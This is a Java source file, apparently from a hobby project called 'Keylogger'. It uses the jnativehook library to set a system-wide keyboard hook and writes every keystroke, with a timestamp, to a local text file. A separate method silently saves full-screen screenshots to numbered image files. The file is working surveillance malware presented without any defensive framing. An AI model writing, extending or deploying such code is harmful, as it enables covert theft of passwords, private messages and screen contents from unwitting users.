package model;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

import javax.imageio.ImageIO;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;


public class Logger implements NativeKeyListener {
	private static final String FILENAME = "/lib/output.txt";
	BufferedWriter bw = null;
	FileWriter fw = null;

	public void nativeKeyPressed(NativeKeyEvent e)
	{

	    try {
	      DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
	          Date date = new Date();

	        fw = new FileWriter(FILENAME,true);
	        bw = new BufferedWriter(fw);
	        bw.write(NativeKeyEvent.getKeyText(e.getKeyCode())+"\t");

	        bw.write(dateFormat.format(date));
	        fw.write("\r\n");

	        System.out.println("Done");

	    } catch (IOException e1) {

	        e1.printStackTrace();

	    } finally {

	        try {

	            if (bw != null)
	                bw.close();

	            if (fw != null)
	                fw.close();

	        } catch (IOException ex) {

	            ex.printStackTrace();

	        }

	    }

	    if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) 
	    {
	        try 
	        {
	            GlobalScreen.unregisterNativeHook();
	        } 
	        catch (NativeHookException e1)
	        {

	            e1.printStackTrace();
	        }
	    }
	}

	private String getStringFromInputStream(InputStream url) {
	    return null;
	}
	
	public void start(){
		
	    try 
	    {
	        GlobalScreen.registerNativeHook();
	    }
	    catch (NativeHookException ex) 
	    {
	        System.err.println("There was a problem registering the native hook.");
	        System.err.println(ex.getMessage());
	        System.exit(1);
	    }
	    GlobalScreen.addNativeKeyListener(new Logger());
	  }
	
	public void screenCapture(int i) {
		Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
		BufferedImage capture;
		try {
			Files.createDirectories(Paths.get("C:\\Users\\Val\\eclipse-workspace\\Keylogger\\screenshots"));
			capture = new Robot().createScreenCapture(screenRect);
			ImageIO.write(capture, "bmp", new File("C:\\Users\\Val\\eclipse-workspace\\Keylogger\\screenshots\\sreenshot"+i+".jpg"));
		} catch (AWTException e1) {
			e1.printStackTrace();
		}catch (IOException e) {
			e.printStackTrace();
		}
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}
}